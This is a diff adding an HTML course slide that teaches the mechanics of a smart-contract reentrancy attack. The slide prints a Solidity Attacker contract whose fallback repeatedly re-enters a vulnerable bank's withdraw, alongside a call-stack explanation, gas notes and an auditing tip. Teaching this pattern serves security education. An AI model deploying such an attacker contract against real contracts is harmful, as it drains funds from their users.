@@ -1,0 +1,62 @@
+<div class="h-full w-full flex flex-col p-5 relative overflow-hidden cohortia-bg" data-theme="light">
+  <style>.card-border{border:1px solid rgba(226,232,240,0.9)} pre code{white-space:pre-wrap; tab-size:2; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, 'Roboto Mono', monospace; font-size:13px}</style>
+
+  <div>
+    <div class="flex items-center gap-2 text-[10px] font-bold uppercase tracking-wider text-slate-500 mb-4">
+      <span class="px-2 py-1 rounded-md bg-blue-50 text-blue-700 border border-blue-100">Module 4</span>
+      <span>›</span>
+      <span>Chapter 3.4</span>
+      <span>›</span>
+      <span class="text-slate-700">Attacker Contract Mechanics</span>
+    </div>
+
+    <div class="flex gap-6 h-full">
+      <div class="w-1/2 rounded-2xl p-4 bg-white card-border shadow-sm h-full flex flex-col">
+        <div class="text-xs font-bold uppercase tracking-wider text-slate-500">Attacker example</div>
+        <div class="mt-3 rounded-md bg-slate-900 text-slate-100 p-3 flex-grow overflow-auto">
+          <pre><code>contract Attacker {
+  VulnerableBank public vulnerableBank;
+  uint256 public attackAmount = 1 ether;
+
+  constructor(address _vulnerableBankAddress) {
+    vulnerableBank = VulnerableBank(_vulnerableBankAddress);
+  }
+
+  function attack() public payable {
+    vulnerableBank.deposit{value: attackAmount}();
+    vulnerableBank.withdraw(attackAmount);
+  }
+
+  fallback() external payable {
+    if (address(vulnerableBank).balance >= attackAmount) {
+      vulnerableBank.withdraw(attackAmount); // Reenter
+    }
+  }
+}
+</code></pre>
+        </div>
+      </div>
+
+      <div class="w-1/2 flex flex-col gap-3 h-full">
+        <div class="rounded-xl p-4 bg-white card-border">
+          <div class="text-xs font-bold uppercase tracking-wider text-slate-500">Call stack explanation</div>
+          <ul class="mt-2 text-sm text-slate-700 list-disc ml-4">
+            <li>The bank calls msg.sender, which triggers the attacker fallback.</li>
+            <li>The fallback calls back into the bank, creating nested calls on the stack.</li>
+            <li>Because state wasn’t changed, the bank’s checks still succeed each time.</li>
+          </ul>
+        </div>
+
+        <div class="rounded-xl p-4 bg-white card-border">
+          <div class="text-xs font-bold uppercase tracking-wider text-slate-500">Gas and transfer nuances</div>
+          <p class="text-sm text-slate-700 mt-2">transfer/send forward 2300 gas which often prevents fallback from calling out. But they can fail with certain recipients; call forwards flexible gas and must be used with care and proper patterns.</p>
+        </div>
+
+        <div class="rounded-xl p-3 bg-amber-50 card-border mt-auto">
+          <div class="text-[10px] font-bold uppercase tracking-wider text-amber-700">Pro tip</div>
+          <p class="text-sm text-slate-800 mt-1">When auditing, explicitly mark every external call and check whether state has already been mutated to render reentry harmless.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+<style>pre, code, [class*="code"], [class*="editor"], [class*="snippet"], [class*="source"] { white-space: pre-wrap; tab-size: 2; }</style></div>
